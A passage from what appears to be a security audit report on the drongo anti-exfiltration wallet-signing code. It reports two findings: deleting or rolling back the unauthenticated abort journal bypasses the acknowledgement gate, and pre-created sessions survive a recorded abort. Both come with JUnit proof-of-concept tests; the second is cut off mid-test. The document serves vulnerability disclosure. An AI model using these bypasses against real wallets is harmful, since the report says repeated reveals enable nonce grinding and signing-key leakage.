         List<AntiExfilSigningSlot> semantic = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         byte[] reconstructed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                 commit, signatures, state.rhos);
         if(!Arrays.equals(reconstructed, state.signedPsbt)) {
             throw fail(STATE_INVALID, "Verified-signature evidence does not reconstruct the stored signed PSBT");
         }
         PSBT original = AntiExfilPsbt.parseCanonicalV0(state.originalPsbt);
         byte[] originalDigest = Sha256Hash.hash(state.originalPsbt);
         Set<VerifiedAntiExfilSignature> verified = new LinkedHashSet<>();
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot signature = signatures.getSlots().get(i);
             byte[] outpoint = original.getTransaction().getInputs().get(authoritative.getInputIndex())
                     .getOutpoint().bitcoinSerialize();
             verified.add(new VerifiedAntiExfilSignature(commit.getSessionId(), originalDigest,
                     state.walletIdentity, authoritative.getInputIndex(), outpoint,
                     authoritative.getSignerPublicKey(), authoritative.getMessageHash(),
                     authoritative.getSighashType(), signature.getSignature()));
         }
         if(verified.size() != semantic.size()) {
             throw fail(STATE_INVALID, "Verified-signature evidence contains duplicate records");
         }
         return Collections.unmodifiableSet(verified);
     }
 
     public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase != Phase.OPENINGS_ACCEPTED) {
                 throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
             }
             if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
                     commit.getSessionId(), commit.getPsbtDigest(), reason.name());
         });
     }
 
     public Status getStatus() {
         State state = readValidatedState();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         int abortCount = new AntiExfilAbortJournal(journalPath, walletIdentity).getEvents().size();
         return new Status(state.phase, commit.getSessionId(), commit.getPsbtDigest(), abortCount, false);
     }
 
     private State readValidatedState() {
         return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
     }
 
     private State readValidatedStateUnlocked() throws IOException {
         if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
         State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
         validateState(state);
         return state;
     }
 
     private void validateState(State state) {
         if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
                 commit.getNetwork(), commit.getSessionId(), state.rhos);
         if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
         if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
         if(state.phase == Phase.COMMITMENTS_CREATED) {
             if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message2 == null || state.message3 == null) invalidPhase();
         AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
         AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
         AntiExfilCodec.validateTransition(commit, openings);
         AntiExfilCodec.validateTransition(openings, reveal);
         for(AntiExfilSlot slot : reveal.getSlots()) {
             byte[] expected = state.rhos.get(identifier(slot));
             if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
         }
         if(state.phase == Phase.OPENINGS_ACCEPTED) {
             if(state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         AntiExfilCodec.validateTransition(reveal, signatures);
         byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore, commit, signatures, state.rhos);
         if(!Arrays.equals(rebuiltSigned, state.signedPsbt)) throw fail(STATE_INVALID, "Stored signed PSBT is not reconstructible from verified signatures");
     }
 
     private static byte[] walletIdentity(Keystore keystore) {
         return getWalletKeyIdentity(keystore);
     }
 
     public static byte[] getWalletKeyIdentity(Keystore keystore) {
         if(keystore.getExtendedPublicKey() == null || keystore.getKeyDerivation() == null) throw fail(STATE_INVALID, "Public account keystore is required");
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try {
             bytes.write(keystore.getExtendedPublicKey().getKey().getPubKey());
             bytes.write(keystore.getExtendedPublicKey().getKey().getChainCode());
             bytes.write(keystore.getKeyDerivation().toString().getBytes(StandardCharsets.US_ASCII));
         } catch(IOException impossible) {
             throw new AssertionError(impossible);
         }
         return Sha256Hash.hash(bytes.toByteArray());
     }
 
     private static byte[] encode(State state) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.writeByte(state.phase.ordinal());
             output.write(state.walletIdentity);
             writeBlob(output, state.originalPsbt);
             writeBlob(output, state.message1);
             writeNullableBlob(output, state.message2);
             writeNullableBlob(output, state.message3);
             writeNullableBlob(output, state.message4);
             writeNullableBlob(output, state.signedPsbt);
             output.writeShort(state.rhos.size());
             for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                 output.writeInt(entry.getKey().getInputIndex());
                 output.write(entry.getKey().getSignerPublicKey());
                 output.write(entry.getValue());
             }
         }
         return bytes.toByteArray();
     }
 
     private static State decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
             int phaseCode = input.readUnsignedByte();
             if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
             byte[] identity = input.readNBytes(32);
             byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
             byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
             byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
             int count = input.readUnsignedShort();
             if(identity.length != 32 || count < 1 || count > AntiExfilCodec.MAX_SLOTS) throw new IOException("Invalid coordinator-state header");
             Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
             for(int i = 0; i < count; i++) {
                 int index = input.readInt();
                 byte[] key = input.readNBytes(33);
                 byte[] rho = input.readNBytes(32);
                 if(key.length != 33 || rho.length != 32 || rhos.put(new AntiExfilSigningSlot.Identifier(index, key), rho) != null) {
                     throw new IOException("Invalid or duplicate coordinator randomness record");
                 }
             }
             if(input.available() != 0) throw new IOException("Trailing coordinator-state data");
             return new State(Phase.values()[phaseCode], identity, original, message1, message2, message3, message4, signed, rhos);
         } catch(EOFException e) {
             throw new IOException("Truncated coordinator state", e);
         }
     }
 
     private static void writeBlob(DataOutputStream output, byte[] value) throws IOException {
         output.writeInt(value.length);
         output.write(value);
     }
 
     private static void writeNullableBlob(DataOutputStream output, byte[] value) throws IOException {
         if(value == null) output.writeInt(-1); else writeBlob(output, value);
     }
 
     private static byte[] readBlob(DataInputStream input, int maximum, boolean nullable) throws IOException {
         int length = input.readInt();
         if(nullable && length == -1) return null;
         if(length < 1 || length > maximum) throw new IOException("Stored blob length is outside limits");
         byte[] value = input.readNBytes(length);
         if(value.length != length) throw new IOException("Truncated stored blob");
         return value;
     }
 
     private static byte[] random32(SecureRandom random) {
         byte[] value = new byte[32];
         random.nextBytes(value);
         return value;
     }
 
     private static boolean containsValue(Map<AntiExfilSigningSlot.Identifier, byte[]> values, byte[] candidate) {
         return values.values().stream().anyMatch(value -> Arrays.equals(value, candidate));
     }
 
     private static AntiExfilSigningSlot.Identifier identifier(AntiExfilSlot slot) {
         if(slot.getInputIndex() > Integer.MAX_VALUE) throw fail(SIGNATURE_SLOT_MISMATCH, "Input index is outside Java PSBT limits");
         return new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
     }
 
     private static void invalidPhase() {
         throw fail(STATE_INVALID, "Coordinator phase and stored transcripts disagree");
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     public enum Phase {
         COMMITMENTS_CREATED,
         OPENINGS_ACCEPTED,
         COMPLETE
     }
 
     public enum AbortReason {
         TRANSPORT_FAILED,
         SIGNER_CANCELLED,
         SIGNATURE_REJECTED,
         USER_ABANDONED
     }
 
     public static final class Completion {
         private final byte[] signedPsbt;
         private final Set<VerifiedAntiExfilSignature> verifiedSignatures;
         private final boolean broadcast;
 
         private Completion(byte[] signedPsbt, Set<VerifiedAntiExfilSignature> verifiedSignatures, boolean broadcast) {
             this.signedPsbt = signedPsbt.clone();
             this.verifiedSignatures = Set.copyOf(verifiedSignatures);
             this.broadcast = broadcast;
         }
 
         public byte[] getSignedPsbt() { return signedPsbt.clone(); }
         public Set<VerifiedAntiExfilSignature> getVerifiedSignatures() { return verifiedSignatures; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     public static final class Status {
         private final Phase phase;
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final int postRevealAbortCount;
         private final boolean broadcast;
 
         private Status(Phase phase, byte[] sessionId, byte[] psbtDigest, int postRevealAbortCount, boolean broadcast) {
             this.phase = phase;
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.postRevealAbortCount = postRevealAbortCount;
             this.broadcast = broadcast;
         }
 
         public Phase getPhase() { return phase; }
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public int getPostRevealAbortCount() { return postRevealAbortCount; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     private record State(Phase phase, byte[] walletIdentity, byte[] originalPsbt, byte[] message1,
                          byte[] message2, byte[] message3, byte[] message4, byte[] signedPsbt,
                          Map<AntiExfilSigningSlot.Identifier, byte[]> rhos) {
         private State {
             walletIdentity = walletIdentity.clone();
             originalPsbt = originalPsbt.clone();
             message1 = message1.clone();
             message2 = copy(message2);
             message3 = copy(message3);
             message4 = copy(message4);
             signedPsbt = copy(signedPsbt);
             Map<AntiExfilSigningSlot.Identifier, byte[]> copied = new LinkedHashMap<>();
             rhos.forEach((identifier, rho) -> copied.put(identifier, rho.clone()));
             rhos = Map.copyOf(copied);
         }
 
         private static byte[] copy(byte[] value) { return value == null ? null : value.clone(); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java`
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
### Validation output

```
[output truncated: 28 lines & 0.9150390625 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 2s
```

---

# Abort history can be erased or rolled back
**#247988**
- Severity: Critical
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
#### Lines 41-52 — _The only integrity trailer is publicly computable SHA-256._

```
    static byte[] read(Path path, int maximumBytes) throws IOException {
        byte[] encoded = Files.readAllBytes(path);
        if(encoded.length < 32 || encoded.length > maximumBytes) throw new IOException("State length is outside limits");
        byte[] body = Arrays.copyOf(encoded, encoded.length - 32);
        byte[] checksum = Arrays.copyOfRange(encoded, encoded.length - 32, encoded.length);
        if(!Arrays.equals(Sha256Hash.hash(body), checksum)) throw new IOException("State checksum mismatch");
        return body;
    }

    static void write(Path path, byte[] body, boolean createOnly) throws IOException {
        if(createOnly && Files.exists(path)) throw new IOException("State already exists");
        byte[] encoded = ByteBuffer.allocate(body.length + 32).put(body).put(Sha256Hash.hash(body)).array();
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java` (2 locations)
#### Lines 60-68 — _A missing journal is recreated empty and existing history has no authenticity check._

```
    private Journal loadOrCreate() throws IOException {
        if(!Files.exists(path)) {
            Journal journal = new Journal(walletIdentity, List.of());
            AntiExfilDurableFiles.write(path, encode(journal), true);
            return journal;
        }
        Journal journal = decode(AntiExfilDurableFiles.read(path, MAX_FILE_BYTES));
        if(!Arrays.equals(walletIdentity, journal.walletIdentity)) throw new IOException("Abort journal belongs to another wallet key identity");
        return journal;
```
⋯
#### Lines 71-87 — _The serialized journal contains no keyed or monotonic authenticator._

```
    private static byte[] encode(Journal journal) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        try(DataOutputStream output = new DataOutputStream(bytes)) {
            output.write(MAGIC);
            output.writeByte(VERSION);
            output.write(journal.walletIdentity);
            output.writeInt(journal.events.size());
            for(AbortEvent event : journal.events) {
                byte[] reason = event.reason.getBytes(StandardCharsets.UTF_8);
                output.write(event.sessionId);
                output.write(event.psbtDigest);
                output.writeLong(event.recordedAtEpochSecond);
                output.writeShort(reason.length);
                output.write(reason);
            }
        }
        return bytes.toByteArray();
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
#### Lines 82-89 — _Creation gates solely on whether the decoded event list is empty._

```
        List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
        if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
            throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
        }
        AntiExfilDurableFiles.locked(sessionPath, () -> {
            AntiExfilDurableFiles.write(sessionPath, encode(state), true);
            return null;
        });
```
## Description

Fresh-session authorization depends only on whether the selected abort journal decodes to a nonempty event list. The durable envelope uses an unkeyed SHA-256 checksum, and the wallet identity embedded in the journal is derived entirely from public account-key material. Deleting the journal makes `loadOrCreate` silently initialize a valid empty journal, while replacing it with an older or forged empty body also passes the available checks. No MAC, signature, monotonic counter, or authoritative external marker authenticates retained abort events. The subsequent `create(..., acknowledgePostRevealAbortRisk=false)` therefore treats erased history as proof that no post-reveal abort occurred.
## Root cause

The journal is rollbackable and unauthenticated, and absence is interpreted as an empty trustworthy history rather than a security failure.
## Impact

A filesystem actor can remove the acknowledgement barrier after a selective abort and permit repeated reveal attempts. Repeated attempts restore the signer-side nonce-grinding channel and can leak private-key material despite the journal appearing valid.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void deletedAbortJournalRemovesRequiredAcknowledgementAndAllowsAnotherHostReveal() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        List<byte[]> signerOpenings = signerOpeningsFromFinalSignatures(Utils.hexToBytes(field(vector, "message_4_hex")));
        Keystore keystore = keystore();
        Path journal = temporary.resolve("wallet.aexj");

        Path abortedSession = temporary.resolve("aborted.aexs");
        AntiExfilCoordinator first = AntiExfilCoordinator.create(abortedSession, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false);
        byte[] firstReveal = first.acceptOpenings(openingsForCommit(first.getHostCommitMessage(), signerOpenings));
        AntiExfilMessage firstRevealMessage = AntiExfilCodec.decode(firstReveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, firstRevealMessage.getStage());
        first.recordPostRevealAbort(AntiExfilCoordinator.AbortReason.SIGNER_CANCELLED);
        assertEquals(1, first.getStatus().getPostRevealAbortCount());

        Path blockedSession = temporary.resolve("blocked.aexs");
        AntiExfilException blocked = assertThrows(AntiExfilException.class, () -> AntiExfilCoordinator.create(
                blockedSession, journal, original, keystore, AntiExfilNetwork.TESTNET4, false));
        assertEquals(AntiExfilException.Code.RETRY_CONFLICT, blocked.getCode());
        assertFalse(Files.exists(blockedSession));
        assertEquals(1, new AntiExfilAbortJournal(journal, AntiExfilCoordinator.getWalletKeyIdentity(keystore)).getEvents().size());

        Files.delete(journal);

        Path bypassedSession = temporary.resolve("bypassed.aexs");
        AntiExfilCoordinator second = AntiExfilCoordinator.create(bypassedSession, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false);
        assertTrue(Files.exists(bypassedSession));
        assertEquals(0, second.getStatus().getPostRevealAbortCount());

        byte[] secondReveal = second.acceptOpenings(openingsForCommit(second.getHostCommitMessage(), signerOpenings));
        AntiExfilMessage secondRevealMessage = AntiExfilCodec.decode(secondReveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, secondRevealMessage.getStage());
        assertFalse(Arrays.equals(firstRevealMessage.getSessionId(), secondRevealMessage.getSessionId()));
        assertFalse(Arrays.equals(firstRevealMessage.getSlots().getFirst().getHostRandomness(),
                secondRevealMessage.getSlots().getFirst().getHostRandomness()));
    }

    private static byte[] openingsForCommit(byte[] commitBytes, List<byte[]> signerOpenings) {
        AntiExfilMessage commit = AntiExfilCodec.decode(commitBytes);
        assertEquals(signerOpenings.size(), commit.getSlots().size());
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(int i = 0; i < commit.getSlots().size(); i++) {
            AntiExfilSlot slot = commit.getSlots().get(i);
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), signerOpenings.get(i), null, null));
        }
        return AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), openingSlots));
    }

    private static List<byte[]> signerOpeningsFromFinalSignatures(byte[] finalSignatures) {
        AntiExfilMessage finalMessage = AntiExfilCodec.decode(finalSignatures);
        return finalMessage.getSlots().stream().map(AntiExfilSlot::getOpening).toList();
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 22 lines & 0.984375 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 3s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC uses the real Java coordinator, journal, durable-file, codec, and PSBT code through public coordinator/journal APIs and normal filesystem deletion. It demonstrates journal-deletion rollback; it does not additionally demonstrate forging a zero-event checksummed journal or private-key extraction from repeated nonce grinding.
### Validation reasoning

PoC validation command completed successfully.

---

# Abort gate cannot revoke pre-created sessions
**#247989**
- Severity: High
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (2 locations)
#### Lines 82-89 — _The sole abort-history gate is evaluated during creation._

```
        List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
        if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
            throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
        }
        AntiExfilDurableFiles.locked(sessionPath, () -> {
            AntiExfilDurableFiles.write(sessionPath, encode(state), true);
            return null;
        });
```
⋯
#### Lines 120-150 — _The later rho-release path does not consult the journal._

```
    public byte[] acceptOpenings(byte[] encodedOpenings) {
        if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                return state.message3.clone();
            }
            AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
            AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
            if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
            AntiExfilCodec.validateTransition(commit, openings);
            List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
            for(AntiExfilSlot slot : openings.getSlots()) {
                AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                byte[] rho = state.rhos.get(identifier);
                if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                        slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
            }
            AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                    openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
            AntiExfilCodec.validateTransition(openings, reveal);
            byte[] message3 = AntiExfilCodec.encode(reveal);
            State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                    state.message1, encodedOpenings, message3, null, null, state.rhos);
            // This durable write is the security boundary: no rho is returned before it succeeds.
            AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
            return message3.clone();
        });
    }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java`
#### Lines 35-57 — _Reads return snapshots and appends are independently locked, allowing stale create checks as well._

```
    public List<AbortEvent> getEvents() {
        return AntiExfilDurableFiles.locked(path, () -> List.copyOf(loadOrCreate().events));
    }

    AbortEvent append(byte[] sessionId, byte[] psbtDigest, String reason) {
        if(sessionId == null || sessionId.length != 32 || psbtDigest == null || psbtDigest.length != 32) {
            throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort event context");
        }
        byte[] reasonBytes = reason == null ? new byte[0] : reason.strip().getBytes(StandardCharsets.UTF_8);
        if(reasonBytes.length == 0 || reasonBytes.length > MAX_REASON_BYTES) {
            throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                    "Abort reason must contain 1 to " + MAX_REASON_BYTES + " UTF-8 bytes");
        }
        return AntiExfilDurableFiles.locked(path, () -> {
            Journal journal = loadOrCreate();
            if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
            AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
                    new String(reasonBytes, StandardCharsets.UTF_8));
            List<AbortEvent> updated = new ArrayList<>(journal.events);
            updated.add(event);
            AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
            return event;
        });
```
## Description

The wallet-wide abort journal is consulted only when a session is created, not when `acceptOpenings` performs the security-critical host-randomness disclosure. Multiple sessions can therefore be created at distinct paths while the journal is empty. After session A reveals randomness and records an abort, session B remains in `COMMITMENTS_CREATED` and can still call `acceptOpenings` because that path never rechecks the now-nonempty journal. The same stale-check ordering occurs when a create operation snapshots an empty journal concurrently with an abort append and writes its new session afterward. Recording the abort correctly does not revoke these already-issued session capabilities.
## Root cause

The revocation condition is checked once during session creation, while the guarded operation later discloses rho without consulting the journal or a wallet-wide active-session reservation.
## Impact

Concurrent or pre-staged signing flows can disclose additional independent host-randomness draws after an abort without the required acknowledgement. A malicious signer can use those extra draws for selective nonce grinding and eventual signing-key exfiltration.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void preCreatedSessionStillRevealsHostRandomnessAfterWalletWideAbort() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] vectorSignatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        AntiExfilMessage signatureTemplate = AntiExfilCodec.decode(vectorSignatures);
        Keystore keystore = keystore();
        Path journal = temporary.resolve("wallet.aexj");

        AntiExfilCoordinator sessionA = AntiExfilCoordinator.create(temporary.resolve("session-a.aexs"), journal,
                original, keystore, AntiExfilNetwork.TESTNET4);
        AntiExfilCoordinator sessionB = AntiExfilCoordinator.create(temporary.resolve("session-b.aexs"), journal,
                original, keystore, AntiExfilNetwork.TESTNET4);

        assertEquals(AntiExfilCoordinator.Phase.COMMITMENTS_CREATED, sessionA.getStatus().getPhase());
        assertEquals(AntiExfilCoordinator.Phase.COMMITMENTS_CREATED, sessionB.getStatus().getPhase());
        assertEquals(0, sessionA.getStatus().getPostRevealAbortCount());
        assertEquals(0, sessionB.getStatus().getPostRevealAbortCount());
        assertNotEquals(Utils.bytesToHex(AntiExfilCodec.decode(sessionA.getHostCommitMessage()).getSessionId()),
                Utils.bytesToHex(AntiExfilCodec.decode(sessionB.getHostCommitMessage()).getSessionId()),
                "The two public create calls issued independent session capabilities");

        byte[] openingsA = openingsFor(sessionA.getHostCommitMessage(), signatureTemplate);
        byte[] revealA = sessionA.acceptOpenings(openingsA);
        AntiExfilMessage revealMessageA = AntiExfilCodec.decode(revealA);
        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessageA.getStage());
        assertEquals(AntiExfilCoordinator.Phase.OPENINGS_ACCEPTED, sessionA.getStatus().getPhase());

        sessionA.recordPostRevealAbort(AntiExfilCoordinator.AbortReason.SIGNER_CANCELLED);
        assertEquals(1, sessionA.getStatus().getPostRevealAbortCount());
        assertEquals(1, sessionB.getStatus().getPostRevealAbortCount());

        Path freshSession = temporary.resolve("fresh-after-abort.aexs");
